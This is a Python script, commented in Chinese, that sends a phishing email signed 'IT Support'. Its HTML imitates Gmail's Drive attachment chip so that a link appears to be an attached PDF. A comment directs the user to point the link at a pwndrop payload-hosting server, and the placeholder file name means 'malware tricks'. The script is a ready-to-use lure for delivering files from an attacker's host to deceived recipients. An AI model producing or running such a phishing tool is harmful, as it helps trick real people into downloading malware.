import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_email_with_fake_attachment(sender_email, sender_password, recipient_email, subject, cloud_link, file_name="document.pdf", file_type="PDF"):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    body = f"""
        <html>
        <head>
        <meta charset="UTF-8">
        </head>
        <body>
            <p>Dear User,</p>
            <p>Please find the attached document:</p>
            <div visibility="visible"><div class="rps_8fe4"><div><div dir="ltr"><br><div style="width: 386px; height: 20px; max-height: 20px; background-color: rgb(46, 46, 46) !important; margin: 6px 0px; padding: 10px; color: rgb(230, 230, 230) !important; font: 400 14px / 20px &quot;Google Sans&quot;, sans-serif; border: 1px solid rgb(221, 221, 221);" class="x_gmail_chip x_gmail_drive_chip" data-ogsc="rgb(34, 34, 34)" data-ogsb="rgb(245, 245, 245)"><a style="color: rgb(229, 231, 235) !important; display: inline-block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; text-decoration: none; border: none; width: 100%;" aria-label="{file_name}.{file_type}" data-auth="NotApplicable" rel="noopener noreferrer" target="_blank" href="{cloud_link}" title="{cloud_link}" data-linkindex="0" data-ogsc="rgb(32, 33, 36)"><img style="vertical-align: text-bottom; border: none; padding-right: 10px; height: 20px; color: rgb(229, 231, 235) !important;" alt="" src="https://ssl.gstatic.com/docs/doclist/images/icon_10_generic_list.png" data-imagetype="External" data-ogsc="">&nbsp;<span style="vertical-align: bottom; color: rgb(229, 231, 235) !important;" dir="ltr" data-ogsc="">{file_name}.{file_type}</span></a></div></div></div></div></div>
            <p>Best regards,<br>IT Support</p>
        </body>
        </html>
    """
    msg.attach(MIMEText(body,'html'))

    with smtplib.SMTP('smtp.163.com', 25) as smtp:  #替换SMTP服务器地址和端口
        smtp.starttls()
        smtp.login(sender_email, sender_password)
        smtp.send_message(msg)
    print(f"Email sent successfully to {recipient_email}")

if __name__ == '__main__':
     sender_email = "发送邮箱地址"
     sender_password = "邮箱密码"
     recipient_email = "目标邮箱地址"
     cloud_link = "https://IP地址或域名/hi.pdf" #替换为pwndrop的托管地址
     file_name = "恶意软件技巧" #附件的文件名
     file_type = "pdf" #附件类型
     subject = "Important Document"
     send_email_with_fake_attachment(sender_email, sender_password, recipient_email, subject, cloud_link,file_name, file_type)
